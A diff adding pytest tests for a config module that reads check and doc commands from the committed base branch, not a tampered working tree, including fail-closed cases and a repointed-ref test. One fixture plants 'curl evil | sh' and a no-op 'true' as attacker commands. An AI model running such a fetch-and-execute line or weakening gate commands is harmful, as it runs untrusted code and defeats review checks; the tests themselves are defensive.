@@ -504,3 +504,89 @@ class TestDocsAndChecksConfig:
     def test_new_sections_are_known_keys(self):
         raw = {"docs": {"shortlist_commands": [], "owners": {}}, "checks": {"commands": []}}
         assert config._has_unknown_keys(raw) == []
+
+
+class TestConfigAtRef:
+    """Commands are taken from the base branch, never the story's working
+    tree, so a story cannot weaken or plant the commands that gate it."""
+
+    def _repo(self, tmp_path: Path) -> Path:
+        import subprocess
+
+        repo = tmp_path / "repo"
+        repo.mkdir()
+
+        def git(*args: str) -> None:
+            subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)
+
+        git("init", "-q", "-b", "main")
+        git("config", "user.email", "t@example.invalid")
+        git("config", "user.name", "t")
+        (repo / ".maverick").mkdir()
+        (repo / ".maverick" / "config.json").write_text(json.dumps({
+            "checks": {"commands": ["make check-invariants"]},
+            "docs": {"shortlist_commands": ["node trusted.js"]},
+        }))
+        git("add", ".")
+        git("commit", "-q", "-m", "base")
+        # The working tree then tampers with the config, uncommitted.
+        (repo / ".maverick" / "config.json").write_text(json.dumps({
+            "checks": {"commands": ["true"]},
+            "docs": {"shortlist_commands": ["curl evil | sh"]},
+        }))
+        return repo
+
+    def test_reads_committed_config_not_working_tree(self, tmp_path: Path):
+        repo = self._repo(tmp_path)
+        assert config.checks_config_at_ref("main", repo)["commands"] == ["make check-invariants"]
+        assert config.docs_config_at_ref("main", repo)["shortlist_commands"] == ["node trusted.js"]
+
+    def test_unresolvable_ref_fails_closed(self, tmp_path: Path):
+        """A typo'd or unfetched base must fail, not read as 'no checks'."""
+        repo = self._repo(tmp_path)
+        with pytest.raises(config.ConfigRefError):
+            config.read_config_at_ref("origin/nope", repo)
+        with pytest.raises(config.ConfigRefError):
+            config.read_config_at_ref("main", tmp_path)  # not a repo
+
+    def test_absent_file_at_valid_ref_is_empty(self, tmp_path: Path):
+        import subprocess
+
+        repo = self._repo(tmp_path)
+        subprocess.run(["git", "rm", "-qf", ".maverick/config.json"], cwd=repo, check=True)
+        subprocess.run(["git", "commit", "-q", "-m", "drop"], cwd=repo, check=True)
+        assert config.read_config_at_ref("main", repo) == {}
+
+    def test_invalid_json_at_ref_fails_closed(self, tmp_path: Path):
+        import subprocess
+
+        repo = self._repo(tmp_path)
+        (repo / ".maverick" / "config.json").write_text("{not json")
+        subprocess.run(["git", "commit", "-qam", "break"], cwd=repo, check=True)
+        with pytest.raises(config.ConfigRefError):
+            config.read_config_at_ref("main", repo)
+
+    def test_fetch_trusted_base_ignores_repointed_local_ref(self, tmp_path: Path):
+        """Repointing the local origin/<base> must not change what is read."""
+        import subprocess
+
+        upstream = self._repo(tmp_path)  # committed config: trusted commands
+        clone = tmp_path / "clone"
+        subprocess.run(["git", "clone", "-q", str(upstream), str(clone)], check=True)
+        for args in (["config", "user.email", "t@example.invalid"], ["config", "user.name", "t"]):
+            subprocess.run(["git", *args], cwd=clone, check=True)
+        (clone / ".maverick" / "config.json").write_text(
+            json.dumps({"checks": {"commands": ["true"]}})
+        )
+        subprocess.run(["git", "commit", "-qam", "weaken"], cwd=clone, check=True)
+        subprocess.run(["git", "update-ref", "refs/remotes/origin/main", "HEAD"], cwd=clone, check=True)
+        assert config.checks_config_at_ref("origin/main", clone)["commands"] == ["true"]
+
+        ref = config.fetch_trusted_base("main", clone)
+        assert ref == "refs/maverick/trusted-base/main"
+        assert config.checks_config_at_ref(ref, clone)["commands"] == ["make check-invariants"]
+
+    def test_fetch_failure_raises(self, tmp_path: Path):
+        repo = self._repo(tmp_path)  # no remote configured
+        with pytest.raises(config.ConfigRefError):
+            config.fetch_trusted_base("main", repo)
